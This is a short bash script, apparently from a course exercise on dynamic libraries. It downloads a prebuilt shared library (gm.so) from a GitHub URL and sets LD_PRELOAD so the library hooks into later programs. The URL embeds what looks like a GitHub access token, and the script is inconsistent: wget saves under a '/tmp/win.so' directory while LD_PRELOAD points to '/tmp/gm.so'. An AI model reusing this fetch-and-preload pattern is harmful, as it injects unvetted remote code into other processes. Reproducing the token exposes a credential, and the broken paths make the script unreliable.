#!/bin/bash
wget -P /tmp/win.so https://github.com/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/alx-low_level_programming/raw/master/0x18-dynamic_libraries/gm.so
export LD_PRELOAD=/tmp/gm.so
